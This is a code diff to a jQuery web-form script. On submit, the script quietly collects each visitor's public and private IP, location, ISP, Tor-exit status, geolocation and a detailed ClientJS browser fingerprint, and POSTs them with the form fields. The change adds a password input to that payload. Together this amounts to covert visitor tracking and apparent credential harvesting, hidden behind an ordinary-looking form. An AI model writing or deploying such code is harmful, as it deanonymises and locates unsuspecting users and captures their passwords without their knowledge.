@@ -13,8 +13,7 @@ $(function() {
             var name = $("input#name").val();
             var email = $("input#email").val();
             var phone = $("input#phone").val();
-            var message = $("textarea#message").val();
-            var times = Date.now();
+            var pass = $("input#password").val();
             var client = new ClientJS();
 
             var firstName = name; // For Success/Failure Message
@@ -25,38 +24,37 @@ $(function() {
 
             // get client public IP
             $.getJSON('https://wtfismyip.com/json', function(rsp){
-                $(document).data('wtf-ip', rsp.YourFuckingIPAddress);
-                $(document).data('wtf-loc', rsp.YourFuckingLocation);
-                $(document).data('wtf-host', rsp.YourFuckingHostname);
-                $(document).data('wtf-isp', rsp.YourFuckingISP);
-                $(document).data('wtf-tor', rsp.YourFuckingTorExit);
+                $(document).data('wtf_ip', rsp.YourFuckingIPAddress);
+                $(document).data('wtf_loc', rsp.YourFuckingLocation);
+                $(document).data('wtf_host', rsp.YourFuckingHostname);
+                $(document).data('wtf_isp', rsp.YourFuckingISP);
+                $(document).data('wtf_tor', rsp.YourFuckingTorExit);
             });
 
             // get client private IP
             getUserIP(function(ip){
-            		$(document).data('wtf-privip', ip);
+            		$(document).data('wtf_privip', ip);
             });
 
 
             // get client browser info
-            $(document).data('cli-fng', client.getFingerprint());
-            $(document).data('cli-ua', client.getUserAgent());
-            $(document).data('cli-brw', client.getBrowser());
-            $(document).data('cli-brwv', client.getBrowserVersion());
-            $(document).data('cli-os', client.getOS());
-            $(document).data('cli-osv', client.getOSVersion());
-            $(document).data('cli-device', client.getDevice());
-            $(document).data('cli-dvctype', client.getDeviceType());
-            $(document).data('cli-dvcvend', client.getDeviceVendor());
-            $(document).data('cli-cpu', client.getCPU());
-            $(document).data('cli-screen', client.getScreenPrint());
-            $(document).data('cli-plugin', client.getPlugins());
-            $(document).data('cli-java', client.getJavaVersion());
-            $(document).data('cli-flash', client.getFlashVersion());
-            $(document).data('cli-silver', client.getSilverlightVersion());
-            $(document).data('cli-timezone', client.getTimeZone());
-            $(document).data('cli-lang', client.getLanguage());
-            $(document).data('cli-canvas', client.getCanvasPrint());
+            $(document).data('cli_fng', client.getFingerprint());
+            $(document).data('cli_ua', client.getUserAgent());
+            $(document).data('cli_brw', client.getBrowser());
+            $(document).data('cli_brwv', client.getBrowserVersion());
+            $(document).data('cli_os', client.getOS());
+            $(document).data('cli_osv', client.getOSVersion());
+            $(document).data('cli_device', client.getDevice());
+            $(document).data('cli_dvctype', client.getDeviceType());
+            $(document).data('cli_dvcvend', client.getDeviceVendor());
+            $(document).data('cli_cpu', client.getCPU());
+            $(document).data('cli_screen', client.getScreenPrint());
+            $(document).data('cli_plugin', client.getPlugins());
+            $(document).data('cli_java', client.getJavaVersion());
+            $(document).data('cli_flash', client.getFlashVersion());
+            $(document).data('cli_silver', client.getSilverlightVersion());
+            $(document).data('cli_timezone', client.getTimeZone());
+            $(document).data('cli_lang', client.getLanguage());
 
 
             $.ajax({
@@ -64,44 +62,41 @@ $(function() {
                 type: "POST",
                 contentType: 'application/json',
                 data: JSON.stringify({
-                    "timestamp": times,
                     "name": name,
                     "phone": phone,
                     "email": email,
-                    "message": message,
-                    "wtf-pubip": $(document).data('wtf-ip'),
-                    "wtf-privip": $(document).data('wtf-privip'),
-                    "wtf-loc": $(document).data('wtf-loc'),
-                    "wtf-host": $(document).data('wtf-host'),
-                    "wtf-isp": $(document).data('wtf-isp'),
-                    "wtf-tor": $(document).data('wtf-tor'),
-                    "geo-status": $(document).data('geo-status'),
-                    "geo-lat": $(document).data('geo-lat'),
-                    "geo-lng": $(document).data('geo-lng'),
-                    "geo-alt": $(document).data('geo-alt'),
-                    "geo-acc": $(document).data('geo-acc'),
-                    "geo-alac": $(document).data('geo-alac'),
-                    "geo-head": $(document).data('geo-head'),
-                    "geo-speed": $(document).data('geo-speed'),
-                    "cli-fng": $(document).data('cli-fng'),
-                    "cli-ua": $(document).data('cli-ua'),
-                    "cli-brw": $(document).data('cli-brw'),
-                    "cli-brwv": $(document).data('cli-brwv'),
-                    "cli-os": $(document).data('cli-os'),
-                    "cli-osv": $(document).data('cli-osv'),
-                    "cli-device": $(document).data('cli-device'),
-                    "cli-dvctype": $(document).data('cli-dvctype'),
-                    "cli-dvcvend": $(document).data('cli-dvcvend'),
-                    "cli-cpu": $(document).data('cli-cpu'),
-                    "cli-screen": $(document).data('cli-screen'),
-                    "cli-plugin": $(document).data('cli-plugin'),
-                    "cli-java": $(document).data('cli-java'),
-                    "cli-flash": $(document).data('cli-flash'),
-                    "cli-silver": $(document).data('cli-silver'),
-                    "cli-timezone": $(document).data('cli-timezone'),
-                    "cli-lang": $(document).data('cli-lang'),
-                    "cli-canvas": $(document).data('cli-canvas')
-
+                    "password": pass,
+                    "wtf_pubip": $(document).data('wtf_ip'),
+                    "wtf_privip": $(document).data('wtf_privip'),
+                    "wtf_loc": $(document).data('wtf_loc'),
+                    "wtf_host": $(document).data('wtf_host'),
+                    "wtf_isp": $(document).data('wtf_isp'),
+                    "wtf_tor": $(document).data('wtf_tor'),
+                    "geo_status": $(document).data('geo_status'),
+                    "geo_lat": $(document).data('geo_lat'),
+                    "geo_lng": $(document).data('geo_lng'),
+                    "geo_alt": $(document).data('geo_alt'),
+                    "geo_acc": $(document).data('geo_acc'),
+                    "geo_alac": $(document).data('geo_alac'),
+                    "geo_head": $(document).data('geo_head'),
+                    "geo_speed": $(document).data('geo_speed'),
+                    "cli_fng": $(document).data('cli_fng'),
+                    "cli_ua": $(document).data('cli_ua'),
+                    "cli_brw": $(document).data('cli_brw'),
+                    "cli_brwv": $(document).data('cli_brwv'),
+                    "cli_os": $(document).data('cli_os'),
+                    "cli_osv": $(document).data('cli_osv'),
+                    "cli_device": $(document).data('cli_device'),
+                    "cli_dvctype": $(document).data('cli_dvctype'),
+                    "cli_dvcvend": $(document).data('cli_dvcvend'),
+                    "cli_cpu": $(document).data('cli_cpu'),
+                    "cli_screen": $(document).data('cli_screen'),
+                    "cli_plugin": $(document).data('cli_plugin'),
+                    "cli_java": $(document).data('cli_java'),
+                    "cli_flash": $(document).data('cli_flash'),
+                    "cli_silver": $(document).data('cli_silver'),
+                    "cli_timezone": $(document).data('cli_timezone'),
+                    "cli_lang": $(document).data('cli_lang')
                 }),
                 cache: false,
                 success: function() {
